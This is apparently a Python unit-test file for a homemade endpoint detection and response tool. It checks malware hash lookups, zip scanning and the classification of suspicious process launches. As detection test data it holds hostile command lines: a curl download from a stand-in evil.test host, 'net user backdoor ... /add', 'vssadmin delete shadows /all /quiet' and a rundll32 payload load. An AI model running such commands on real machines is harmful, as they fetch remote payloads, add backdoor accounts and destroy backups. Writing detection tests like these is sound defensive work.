"""Unit tests for the complete EDR (Level 3.5 stack).

Windows-only pieces (WinDivert, ProcNotifier, WMI) are not started here.
These tests cover the incremental detection logic that can run anywhere.
"""
import hashlib
import os
import queue
import sys
import tempfile
import unittest
import zipfile
from types import SimpleNamespace

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'edr'))
sys.path.insert(0, ROOT)

from common import Component, calculate_hash, hash_file  # noqa: E402
from procmon import (  # noqa: E402
    ProcMon,
    parse_curl_download,
    parse_net_user_add,
    parse_rundll32_dll,
)
from streams import StreamId, reassemble_segments  # noqa: E402
import main as edr  # noqa: E402


EMOTET = "f5524f0acd2dbb535c800a33cf207e4bfd4f5297"


class HashAndZipTests(unittest.TestCase):
    def test_sha1(self):
        self.assertEqual(
            calculate_hash(b'hello'),
            hashlib.sha1(b'hello').hexdigest(),
        )

    def test_hash_file(self):
        with tempfile.NamedTemporaryFile(delete=False) as fh:
            fh.write(b'abc')
            path = fh.name
        try:
            self.assertEqual(hash_file(path), hashlib.sha1(b'abc').hexdigest())
        finally:
            os.unlink(path)

    def test_zip_finds_known_malware_exe(self):
        payload = b'MZ-not-real'
        digest = calculate_hash(payload)
        edr.MALWARES_SHA1[digest] = 'TestMalware'
        try:
            with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as fh:
                zip_path = fh.name
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr('readme.txt', b'ok')
                zf.writestr('payload.exe', payload)
            name, found = edr.find_malware_in_zip(zip_path)
            self.assertEqual(name, 'payload.exe')
            self.assertEqual(found, digest)
        finally:
            edr.MALWARES_SHA1.pop(digest, None)
            os.unlink(zip_path)

    def test_zip_ignores_clean_archive(self):
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as fh:
            zip_path = fh.name
        try:
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr('clean.exe', b'MZ-clean')
            name, found = edr.find_malware_in_zip(zip_path)
            self.assertIsNone(name)
            self.assertIsNone(found)
        finally:
            os.unlink(zip_path)


class ParserTests(unittest.TestCase):
    def test_curl_2_4(self):
        parsed = parse_curl_download('-k https://evil.test/a.exe -o C:\\Temp\\a.exe')
        self.assertEqual(parsed['url'], 'https://evil.test/a.exe')
        self.assertEqual(parsed['download_path'], r'C:\Temp\a.exe')

    def test_curl_rejects_incomplete(self):
        self.assertIsNone(parse_curl_download('-k https://evil.test/a.exe'))

    def test_net_user_add_3_2(self):
        self.assertEqual(
            parse_net_user_add('user backdoor P@ssw0rd /add'),
            'backdoor',
        )
        self.assertIsNone(parse_net_user_add('user backdoor /active:yes'))

    def test_rundll32_3_5(self):
        self.assertEqual(
            parse_rundll32_dll(r'C:\Users\Public\payload.dll,Start'),
            r'C:\Users\Public\payload.dll',
        )
        self.assertEqual(
            parse_rundll32_dll(r'"C:\Temp\x.dll"'),
            r'C:\Temp\x.dll',
        )
        # System DLLs also parse; handle_rundll32_exec drops them unless origin matches.
        self.assertEqual(
            parse_rundll32_dll('shell32.dll,Control_RunDLL'),
            'shell32.dll',
        )
        self.assertIsNone(parse_rundll32_dll('notepad.exe'))


class StreamTests(unittest.TestCase):
    def test_reassemble_in_order(self):
        self.assertEqual(
            reassemble_segments({0: b'HTTP', 4: b'/1.1'}),
            b'HTTP/1.1',
        )

    def test_reassemble_gap_returns_empty(self):
        self.assertEqual(reassemble_segments({0: b'AA', 4: b'BB'}), b'')

    def test_stream_id_filter(self):
        sid = StreamId('1.2.3.4', '10.0.0.1', 80, 5555)
        self.assertTrue(sid.is_match({'sport': 80}))
        self.assertFalse(sid.is_match({'sport': 443}))


class OriginAndHandlerTests(unittest.TestCase):
    def setUp(self):
        edr.origins.clear()
        edr.alert_history.clear()
        self.alerts = []
        self._orig_alert = edr.alert
        edr.alert = self._capture_alert

    def tearDown(self):
        edr.alert = self._orig_alert
        edr.origins.clear()

    def _capture_alert(self, event, title, detection, prevention):
        self.alerts.append(title)

    def test_http_download_records_origin_and_kills_known_hash(self):
        killed = []
        orig_kill = edr.Prevention.kill_process
        edr.Prevention.kill_process = lambda self, pid: killed.append(pid)
        try:
            event = {
                'kind': 'http_download',
                'hash': EMOTET,
                'serveraddr': '1.2.3.4',
                'port': 80,
                'pid': 4242,
                'time': 1_700_000_000,
                'component': 'Firewall',
            }
            edr.handle_http_download(event)
            self.assertIn(EMOTET, edr.origins)
            self.assertEqual(killed, [4242])
            self.assertEqual(self.alerts, ['Malicious download'])
        finally:
            edr.Prevention.kill_process = orig_kill

    def test_curl_origin_is_path_keyed(self):
        event = {
            'download_path': r'C:\Temp\evil.exe',
            'url': 'https://evil.test/evil.exe',
            'time': 1_700_000_000,
            'parent': 99,
        }
        edr.handle_curl_download(event)
        self.assertIn(r'C:\Temp\evil.exe', edr.origins)

    def test_exe_file_deletes_known_hash(self):
        payload = bytes.fromhex(
            # not the real malware; we patch the intel dict
            '4d5a'
        )
        digest = calculate_hash(payload)
        edr.MALWARES_SHA1[digest] = 'TestMalware'
        with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as fh:
            fh.write(payload)
            path = fh.name
        try:
            edr.handle_exe_file({'path': path, 'component': 'FileMon'})
            self.assertFalse(os.path.exists(path))
            self.assertEqual(self.alerts, ['Malicious file'])
        finally:
            edr.MALWARES_SHA1.pop(digest, None)
            if os.path.exists(path):
                os.unlink(path)

    def test_c2_without_pid_still_alerts(self):
        edr.handle_blocked_malicious_ip({
            'addr': '89.233.43.71',
            'direction': 'Outgoing',
            'pid': None,
            'component': 'Firewall',
        })
        self.assertEqual(self.alerts, ['Malicious network connection'])

    def test_rundll32_requires_same_downloader_parent(self):
        with tempfile.NamedTemporaryFile(suffix='.dll', delete=False) as fh:
            fh.write(b'dll-bytes')
            dll_path = fh.name
        digest = hash_file(dll_path)
        edr.set_origin(digest, 'https://evil.test/x.dll', 1_700_000_000, 111)
        deleted = []
        killed = []
        orig_del = edr.Prevention.delete_file
        orig_kill = edr.Prevention.kill_process
        edr.Prevention.delete_file = lambda self, path: deleted.append(path)
        edr.Prevention.kill_process = lambda self, pid: killed.append(pid)
        try:
            edr.handle_rundll32_exec({
                'path': dll_path,
                'pid': 222,
                'parent': 111,
                'component': 'ProcMon',
            })
            self.assertEqual(deleted, [dll_path])
            self.assertEqual(killed, [222, 111])
            self.assertEqual(self.alerts, ['Remote DLL loader'])

            self.alerts.clear()
            edr.handle_rundll32_exec({
                'path': dll_path,
                'pid': 222,
                'parent': 999,  # different parent
                'component': 'ProcMon',
            })
            self.assertEqual(self.alerts, [])
        finally:
            edr.Prevention.delete_file = orig_del
            edr.Prevention.kill_process = orig_kill
            os.unlink(dll_path)

    def test_handler_map_covers_all_levels(self):
        expected = {
            'exe_file', 'blocked_malicious_ip', 'ransomware_behavior',
            'zip_file', 'new_listener_detected', 'http_download',
            'curl_download', 'camouflaged_exe', 'user_added',
            'new_startup_command', 'new_service', 'rundll32_exec',
        }
        self.assertEqual(set(edr.event_handlers), expected)


class ProcMonEventTests(unittest.TestCase):
    def setUp(self):
        self.q = queue.Queue()
        self.pm = ProcMon.__new__(ProcMon)
        Component.__init__(self.pm, self.q, 'ProcMon')

    def _kinds(self):
        kinds = []
        while not self.q.empty():
            kinds.append(self.q.get_nowait()['kind'])
        return kinds

    def test_ransomware_1_3(self):
        self.pm._handle_new_process({
            'path': r'C:\Windows\System32\vssadmin.exe',
            'args': 'delete shadows /all /quiet',
            'pid': 10,
            'ppid': 9,
        })
        self.assertEqual(self._kinds(), ['ransomware_behavior'])

    def test_curl_2_4(self):
        self.pm._handle_new_process({
            'path': r'C:\Windows\System32\curl.exe',
            'args': '-k https://x.test/a.exe -o C:\\a.exe',
            'pid': 10,
            'ppid': 9,
        })
        self.assertEqual(self._kinds(), ['curl_download'])

    def test_net_user_3_2(self):
        self.pm._handle_new_process({
            'path': r'C:\Windows\System32\net.exe',
            'args': 'user evil Passw0rd /add',
            'pid': 10,
            'ppid': 9,
        })
        self.assertEqual(self._kinds(), ['user_added'])

    def test_rundll32_3_5(self):
        self.pm._handle_new_process({
            'path': r'C:\Windows\System32\rundll32.exe',
            'args': r'C:\Users\Public\stage.dll,Start',
            'pid': 10,
            'ppid': 9,
        })
        event = self.q.get_nowait()
        self.assertEqual(event['kind'], 'rundll32_exec')
        self.assertEqual(event['path'], r'C:\Users\Public\stage.dll')


class FileMonKindTests(unittest.TestCase):
    def test_exe_and_zip_events(self):
        from filemon import FileMon

        fm = FileMon.__new__(FileMon)
        q = queue.Queue()
        Component.__init__(fm, q, 'FileMon')
        fm._is_executable = lambda path: False

        fm.on_modified(SimpleNamespace(src_path=r'C:\Temp\a.exe'))
        fm.on_modified(SimpleNamespace(src_path=r'C:\Temp\a.zip'))
        fm.on_modified(SimpleNamespace(src_path=r'C:\Temp\photo.jpg'))
        kinds = []
        while not q.empty():
            kinds.append(q.get_nowait()['kind'])
        self.assertEqual(kinds, ['exe_file', 'zip_file'])

        fm._is_executable = lambda path: True
        fm.on_modified(SimpleNamespace(src_path=r'C:\Temp\photo.jpg'))
        self.assertEqual(q.get_nowait()['kind'], 'camouflaged_exe')


class WinDivertSkipTests(unittest.TestCase):
    def test_non_windows(self):
        from firewall import windivert_skip_reason
        msg = windivert_skip_reason(os_name='posix', arm64=False, divert=object())
        self.assertIn('Windows-only', msg)

    def test_missing_pydivert(self):
        from firewall import windivert_skip_reason
        msg = windivert_skip_reason(os_name='nt', arm64=False, divert=None)
        self.assertIn('pydivert is not installed', msg)

    def test_arm64_python(self):
        from firewall import windivert_skip_reason
        msg = windivert_skip_reason(os_name='nt', arm64=True, divert=object())
        self.assertIn('ARM64', msg)
        self.assertIn('WinError 193', msg)

    def test_amd64_ready(self):
        from firewall import windivert_skip_reason
        self.assertIsNone(
            windivert_skip_reason(os_name='nt', arm64=False, divert=object())
        )


if __name__ == '__main__':
    unittest.main()
